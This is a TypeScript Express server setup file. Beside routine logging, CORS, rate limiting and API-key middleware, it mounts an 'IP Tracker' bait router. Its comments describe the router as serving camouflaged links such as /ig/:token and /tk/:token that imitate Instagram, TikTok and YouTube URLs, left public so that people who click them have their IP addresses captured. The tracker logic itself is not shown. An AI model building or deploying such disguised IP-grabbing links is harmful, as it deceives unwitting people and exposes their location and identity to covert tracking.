import express, { type Express } from "express";
import cors from "cors";
import pinoHttp from "pino-http";
import router from "./routes";
import { baitRouter } from "./routes/tracker";
import { logger } from "./lib/logger";
import { apiKeyMiddleware } from "./middlewares/apiKey.js";
import { generalLimiter } from "./middlewares/rateLimit.js";

const app: Express = express();

app.use(
  pinoHttp({
    logger,
    serializers: {
      req(req) {
        return {
          id: req.id,
          method: req.method,
          url: req.url?.split("?")[0],
        };
      },
      res(res) {
        return {
          statusCode: res.statusCode,
        };
      },
    },
  }),
);

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ── IP Tracker bait routes — no auth, must be at root (camouflaged URLs) ──
// These serve /ig/:token, /tk/:token, /yt/:token etc. — look like real social media links.
// Must be registered BEFORE apiKeyMiddleware so they're publicly accessible.
app.use("/", baitRouter);

// ── Security middleware ────────────────────────────────────────────────────
app.use(generalLimiter);
app.use(apiKeyMiddleware);

app.use("/api", router);

export default app;
